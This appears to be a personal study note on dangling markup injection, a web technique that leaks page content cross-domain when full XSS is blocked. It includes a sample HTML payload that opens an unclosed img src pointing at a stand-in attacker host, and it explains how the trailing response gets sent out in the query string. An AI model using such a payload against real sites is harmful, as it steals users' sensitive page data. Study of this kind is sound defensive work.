Dangling markup injection is a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible.
## Example
Suppose an application is vulnerable to XSS and does not filter or escape the `>` or `"` characters. An attacker can break out of any quoted attribute value and the enclosing tag using `">` in their payload which allows them to return to an HTML context.

However, a regular XSS attack is not possible, due to input filters, [content security policy](obsidian://open?vault=security-notes&file=Offensive%20Security%2FWeb%20Application%20Security%2FClient-side%20Vulnerabilities%2FCross-Site%20Scripting%2FContent%20Security%20Policy%2FIntroduction), or other obstacles. In this case, an attacker can deliver the following payload:
```html
"><img src='//attacker-website.com?
```
This payload creates an `img` tag and defines the start of a `src` attribute containing a URL on the attacker's server. Note the payload doesn't close the `src` attribute, which is left "dangling". When the browser parses the response, it will look throughout the content until it encounters another single quote to terminate the attribute. Everything until that character will be treated as part of the URL and will be sent to the attacker's server within the query string.

The consequence of this example attack is that the attacker can capture part of the application's response following the injection point, which might contain sensitive data.
## Note
Any attribute that makes an external request can be used for dangling markup.